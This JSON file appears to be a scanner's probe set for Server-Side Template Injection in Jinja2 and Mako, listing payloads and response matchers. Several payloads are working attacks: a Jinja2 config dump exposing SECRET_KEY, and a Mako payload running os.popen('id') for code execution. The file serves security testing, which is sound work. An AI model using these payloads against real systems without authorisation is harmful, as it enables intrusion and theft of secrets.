{
  "category": "ssti_python",
  "description": " \u2014 Python engines (Jinja2, Mako)",
  "contexts": {
    "jinja2": {
      "description": "Server-Side Template Injection probes for Jinja2 (Flask/Django Python stacks)",
      "tech_match": [
        "Flask",
        "Django",
        "Python"
      ],
      "param_match": [
        "name",
        "template",
        "msg",
        "text",
        "title",
        "comment",
        "input",
        "value",
        "q"
      ],
      "probes": [
        {
          "payload": "{{7*7}}",
          "description": "Jinja2 arithmetic evaluation \u2014 response containing 49 confirms template execution",
          "matchers": [
            {
              "type": "word",
              "words": [
                "49"
              ],
              "condition": "or"
            },
            {
              "type": "not_word",
              "words": [
                "$49",
                "49 ",
                " 49.",
                "\"49\"",
                "v49",
                "#49"
              ]
            }
          ],
          "severity": "high",
          "confidence_boost": 65,
          "variables": {}
        },
        {
          "payload": "{{config}}",
          "description": "Jinja2 config dump \u2014 reveals SECRET_KEY and DEBUG mode",
          "matchers": [
            {
              "type": "word",
              "words": [
                "SECRET_KEY",
                "DEBUG"
              ],
              "condition": "or"
            }
          ],
          "severity": "critical",
          "confidence_boost": 80,
          "variables": {}
        }
      ]
    },
    "mako": {
      "description": "Server-Side Template Injection probes for Python Mako templates",
      "tech_match": [
        "Python",
        "Pyramid",
        "TurboGears"
      ],
      "param_match": [
        "name",
        "template",
        "msg",
        "text",
        "title",
        "comment",
        "input",
        "value",
        "q"
      ],
      "probes": [
        {
          "payload": "${7*7}",
          "description": "Mako expression evaluation \u2014 49 in response confirms Mako template execution",
          "matchers": [
            {
              "type": "word",
              "words": [
                "49"
              ],
              "condition": "or"
            },
            {
              "type": "not_word",
              "words": [
                "$49",
                "49 ",
                " 49.",
                "\"49\"",
                "v49",
                "#49"
              ]
            }
          ],
          "severity": "high",
          "confidence_boost": 60,
          "variables": {}
        },
        {
          "payload": "<%import os%>${os.popen('id').read()}",
          "description": "Mako RCE via import tag and os.popen \u2014 uid= in response confirms arbitrary code execution",
          "matchers": [
            {
              "type": "word",
              "words": [
                "uid="
              ],
              "condition": "or"
            }
          ],
          "severity": "critical",
          "confidence_boost": 95,
          "variables": {}
        },
        {
          "payload": "<% import os %>${os.name}",
          "description": "Mako OS detection via import \u2014 'posix' or 'nt' in response confirms Python code execution within Mako template",
          "matchers": [
            {
              "type": "word",
              "words": [
                "posix",
                "nt"
              ],
              "condition": "or"
            }
          ],
          "severity": "critical",
          "confidence_boost": 85,
          "variables": {}
        }
      ]
    },
    "error_based_blind": {
      "description": "Successful Errors (PortSwigger Top-10-2025 #1): force Jinja2/Mako to raise an exception whose message echoes evaluated output. Blind SSTI extraction where no direct reflection exists. Marker 1337=1336+1 inside the traceback proves evaluation.",
      "tech_match": ["Jinja2", "Mako", "Flask", "Django", "Python"],
      "param_match": ["name", "template", "q", "msg", "comment", "input"],
      "probes": [
        {
          "payload": "{{1336+1}}{{undefined_zz.__err__}}",
          "description": "Trigger an engine error after evaluation; look for 1337 echoed in the exception body.",
          "matchers": [
            {"type": "regex", "pattern": "1337", "weight": 60},
            {"type": "word", "words": ["Traceback", "UndefinedError", "jinja2", "TemplateError"], "condition": "or", "weight": 40}
          ],
          "severity": "high",
          "confidence_boost": 60,
          "variables": {}
        }
      ]
    },
    "boolean_error_blind": {
      "description": "Boolean-error oracle: payload raises an error only when a boolean condition on evaluated state holds, turning blind SSTI into a bit-oracle without direct output.",
      "tech_match": ["Jinja2", "Flask", "Python"],
      "param_match": ["name", "template", "q"],
      "probes": [
        {
          "payload": "{{ (1 if 7*7==49 else x.__error__) }}",
          "description": "Differential error vs benign baseline when the arithmetic condition is true.",
          "matchers": [
            {"type": "word", "words": ["Error", "Traceback", "Exception"], "condition": "or", "weight": 50}
          ],
          "severity": "medium",
          "confidence_boost": 40,
          "variables": {}
        }
      ]
    }
  }
}